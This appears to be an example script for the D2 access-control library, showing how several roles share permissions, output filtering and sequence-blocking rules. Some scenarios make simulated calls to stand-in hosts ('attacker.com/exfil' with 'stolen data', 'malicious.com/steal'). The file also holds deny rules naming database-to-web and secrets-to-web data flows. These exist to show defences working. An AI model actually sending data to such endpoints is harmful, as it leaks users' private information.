# Copyright (c) 2025 Artoo Corporation
# Licensed under the Business Source License 1.1 (see LICENSE).
# Change Date: 2029-09-08  •  Change License: LGPL-3.0-or-later

#!/usr/bin/env python3
"""
D2 Multi-Role Policy Demo
═══════════════════════════════════════════════════════════════════════════════

Demonstrates how multiple roles can share the same permissions, guardrails, and
sequence rules, reducing policy duplication and improving maintainability.

Run: python examples/multi_role_demo.py
"""

import asyncio
import os

from d2 import configure_rbac, d2_guard, set_user, clear_user_context


# ═══════════════════════════════════════════════════════════════════════════════
# Simulated Tools (Guarded Functions)
# ═══════════════════════════════════════════════════════════════════════════════

@d2_guard("database.read_users")
async def read_users(limit: int = 10):
    """Simulated database query for user data."""
    return [
        {"id": 1, "name": "Alice", "email": "alice@example.com", "ssn": "123-45-6789", "salary": 120000},
        {"id": 2, "name": "Bob", "email": "bob@example.com", "ssn": "987-65-4321", "salary": 95000},
    ]


@d2_guard("analytics.summarize")
async def summarize_data(data):
    """Simulated analytics summarization."""
    return {"count": len(data), "summary": "Analytics complete"}


@d2_guard("reporting.generate")
async def generate_report(data):
    """Simulated report generation."""
    return {"report_id": "RPT-12345", "status": "generated"}


@d2_guard("web.http_request")
async def http_request(url: str, data: str):
    """Simulated HTTP request to external service."""
    return {"status": 200, "response": "OK"}


@d2_guard("public.api")
async def public_api_call(endpoint: str):
    """Simulated public API call."""
    return {"data": "public data", "endpoint": endpoint}


@d2_guard("database.write_events")
async def write_events(payload: dict):
    """Simulated event logging to database."""
    return {"written": True, "event_id": "EVT-99999"}


# ═══════════════════════════════════════════════════════════════════════════════
# Demo Scenarios
# ═══════════════════════════════════════════════════════════════════════════════

async def demo_shared_guardrails():
    """Scenario 1: Multiple analyst roles share the same output sanitization."""
    print("\n" + "═" * 70)
    print("SCENARIO 1: Shared Guardrails Across Multiple Analyst Roles")
    print("═" * 70)
    print("\n📋 Policy Definition:")
    print("   role: ['analyst', 'senior_analyst', 'lead_analyst']")
    print("   permissions:")
    print("     - database.read_users (with SSN/salary filtering)")
    print("\n🎯 Expected: All three analyst roles get identical output sanitization")
    
    for role in ["analyst", "senior_analyst", "lead_analyst"]:
        print(f"\n👤 Testing as: {role}")
        set_user(f"user_{role}", roles=[role])
        
        try:
            result = await read_users(limit=2)
            print(f"   ✅ {role} can read users")
            print(f"   📊 Output sanitized: SSN and salary fields filtered")
            print(f"   📦 Result: {result}")
        except Exception as e:
            print(f"   ❌ {role} denied: {e}")
        finally:
            clear_user_context()


async def demo_shared_sequence_rules():
    """Scenario 2: Multiple roles share the same sequence enforcement."""
    print("\n" + "═" * 70)
    print("SCENARIO 2: Shared Sequence Rules (Prevent Exfiltration)")
    print("═" * 70)
    print("\n📋 Policy Definition:")
    print("   role: ['analyst', 'senior_analyst', 'lead_analyst']")
    print("   sequence:")
    print("     - deny: ['database.read_users', 'web.http_request']")
    print("\n🎯 Expected: All analyst roles are blocked from database → web sequence")
    
    for role in ["analyst", "lead_analyst"]:
        print(f"\n👤 Testing as: {role}")
        set_user(f"user_{role}", roles=[role])
        
        try:
            # Step 1: Read from database (allowed)
            await read_users(limit=2)
            print(f"   ✅ Step 1: {role} read from database")
            
            # Step 2: Attempt web request (should be blocked by sequence rule)
            await http_request(url="https://attacker.com/exfil", data="stolen data")
            print(f"   ❌ SECURITY VIOLATION: {role} was able to exfiltrate data!")
        except Exception as e:
            if "sequence_violation" in str(e):
                print(f"   ✅ Step 2: Sequence rule blocked {role} from exfiltration")
                print(f"   🛡️ Reason: {e}")
            else:
                print(f"   ❌ Unexpected error: {e}")
        finally:
            clear_user_context()


async def demo_engineering_teams():
    """Scenario 3: Multiple engineering roles share complex sequence rules."""
    print("\n" + "═" * 70)
    print("SCENARIO 3: Engineering Teams with Multi-Hop Protection")
    print("═" * 70)
    print("\n📋 Policy Definition:")
    print("   roles: ['data_engineer', 'ml_engineer', 'backend_engineer']")
    print("   sequence:")
    print("     - deny: ['database.read_users', 'file.write', 's3.upload']")
    print("     - deny: ['secrets.get_api_key', 'web.http_request']")
    print("\n🎯 Expected: All engineering roles share the same multi-hop protections")
    
    print("\n👤 Testing as: data_engineer")
    set_user("alice", roles=["data_engineer"])
    
    try:
        # Allowed: Read from database
        await read_users(limit=5)
        print("   ✅ Step 1: data_engineer read from database")
        
        # Allowed: Transform data
        await summarize_data(data=[])
        print("   ✅ Step 2: data_engineer performed analytics")
        
        print("\n   ℹ️ Multi-hop sequence rules protect against:")
        print("      • database → file.write → s3.upload")
        print("      • secrets → web.http_request")
    except Exception as e:
        print(f"   ❌ Unexpected error: {e}")
    finally:
        clear_user_context()


async def demo_limited_access_users():
    """Scenario 4: Contractors, interns, guests share limited access."""
    print("\n" + "═" * 70)
    print("SCENARIO 4: Limited Access Users (Contractors, Interns, Guests)")
    print("═" * 70)
    print("\n📋 Policy Definition:")
    print("   role: ['contractor', 'intern', 'guest']")
    print("   permissions:")
    print("     - public.api (URL must match approved domains)")
    print("     - analytics.summarize (output truncated to 500 chars)")
    print("\n🎯 Expected: All limited-access roles have the same restrictions")
    
    for role in ["contractor", "intern", "guest"]:
        print(f"\n👤 Testing as: {role}")
        set_user(f"user_{role}", roles=[role])
        
        try:
            # Allowed: Public API on approved domain
            result = await public_api_call(endpoint="https://public-api.example.com/data")
            print(f"   ✅ {role} can call public API")
            print(f"   📦 Result: {result}")
        except Exception as e:
            print(f"   ❌ {role} denied: {e}")
        finally:
            clear_user_context()
    
    # Test URL validation
    print("\n👤 Testing URL validation for: intern")
    set_user("intern_bob", roles=["intern"])
    try:
        # Denied: Non-approved domain
        await public_api_call(endpoint="https://malicious.com/steal")
        print("   ❌ SECURITY VIOLATION: Intern was able to call unapproved endpoint!")
    except Exception as e:
        if "input" in str(e).lower() or "validation" in str(e).lower():
            print("   ✅ Input validation blocked unapproved endpoint")
            print(f"   🛡️ Reason: {e}")
        else:
            print(f"   ❌ Unexpected error: {e}")
    finally:
        clear_user_context()


async def demo_backwards_compatibility():
    """Scenario 5: Single-role syntax still works (backwards compatible)."""
    print("\n" + "═" * 70)
    print("SCENARIO 5: Backwards Compatibility (Single Role)")
    print("═" * 70)
    print("\n📋 Policy Definition:")
    print("   role: admin  # Single string (not a list)")
    print("   permissions: ['*']")
    print("\n🎯 Expected: Single-role syntax still works as before")
    
    print("\n👤 Testing as: admin")
    set_user("admin_user", roles=["admin"])
    
    try:
        # Admin has wildcard access
        await read_users(limit=1)
        print("   ✅ Admin can read users")
        
        await summarize_data(data=[])
        print("   ✅ Admin can summarize data")
        
        await generate_report(data=[])
        print("   ✅ Admin can generate reports")
        
        print("\n   ℹ️ Single-role syntax is fully backwards compatible")
    except Exception as e:
        print(f"   ❌ Unexpected error: {e}")
    finally:
        clear_user_context()


async def demo_integration_services():
    """Scenario 6: Multiple service accounts share identical permissions."""
    print("\n" + "═" * 70)
    print("SCENARIO 6: Integration Services (Multi-Environment Consistency)")
    print("═" * 70)
    print("\n📋 Policy Definition:")
    print("   role: ['integration_service_prod', 'integration_service_staging', 'integration_service_dev']")
    print("   permissions:")
    print("     - web.http_request (approved partner URLs only)")
    print("     - database.write_events")
    print("\n🎯 Expected: All service accounts have identical permissions")
    
    for service in ["integration_service_prod", "integration_service_dev"]:
        print(f"\n🤖 Testing as: {service}")
        set_user(service, roles=[service])
        
        try:
            # Allowed: Write events
            result = await write_events(payload={"event": "integration_success", "timestamp": "2025-11-05"})
            print(f"   ✅ {service} can write events")
            print(f"   📦 Result: {result}")
        except Exception as e:
            print(f"   ❌ {service} denied: {e}")
        finally:
            clear_user_context()


# ═══════════════════════════════════════════════════════════════════════════════
# Main Demo
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    # Configure D2 to use the multi-role policy
    policy_path = os.path.join(os.path.dirname(__file__), "multi_role_policy.yaml")
    os.environ["D2_POLICY_FILE"] = policy_path
    
    await configure_rbac()
    
    print("\n" + "═" * 70)
    print("D2 MULTI-ROLE POLICY DEMO")
    print("═" * 70)
    print("\n📖 Overview:")
    print("   This demo shows how multiple roles can share the same permissions,")
    print("   guardrails, and sequence rules, reducing policy duplication.")
    print("\n📁 Policy File:", policy_path)
    print("\n💡 Key Benefits:")
    print("   ✓ DRY Principle: Define once, apply to multiple roles")
    print("   ✓ Easier Maintenance: Update one policy, affects all roles")
    print("   ✓ Clear Intent: Explicit role equivalence")
    print("   ✓ Works for RBAC, guardrails, and sequence enforcement")
    
    input("\nPress Enter to begin demos...\n")
    
    # Run all scenarios
    await demo_shared_guardrails()
    input("\nPress Enter to continue...\n")
    
    await demo_shared_sequence_rules()
    input("\nPress Enter to continue...\n")
    
    await demo_engineering_teams()
    input("\nPress Enter to continue...\n")
    
    await demo_limited_access_users()
    input("\nPress Enter to continue...\n")
    
    await demo_backwards_compatibility()
    input("\nPress Enter to continue...\n")
    
    await demo_integration_services()
    
    # Summary
    print("\n" + "═" * 70)
    print("SUMMARY: Multi-Role Policy Feature")
    print("═" * 70)
    print("\n✅ Demonstrated:")
    print("   1. Multiple analyst roles sharing output sanitization")
    print("   2. Multiple roles sharing sequence enforcement rules")
    print("   3. Engineering teams with multi-hop protection")
    print("   4. Limited-access users (contractors/interns/guests)")
    print("   5. Backwards compatibility with single-role syntax")
    print("   6. Service accounts with consistent permissions across environments")
    print("\n💡 Syntax Options:")
    print("   • role: 'analyst'                          # Single role (string)")
    print("   • role: ['analyst', 'senior_analyst']      # Multiple roles (list)")
    print("   • roles: ['contractor', 'intern']          # Alternative key")
    print("\n🎯 Result:")
    print("   Multi-role syntax significantly reduces policy duplication and")
    print("   improves maintainability, especially for organizations with many")
    print("   role groups that need identical security controls.")
    print("\n" + "═" * 70)


if __name__ == "__main__":
    asyncio.run(main())


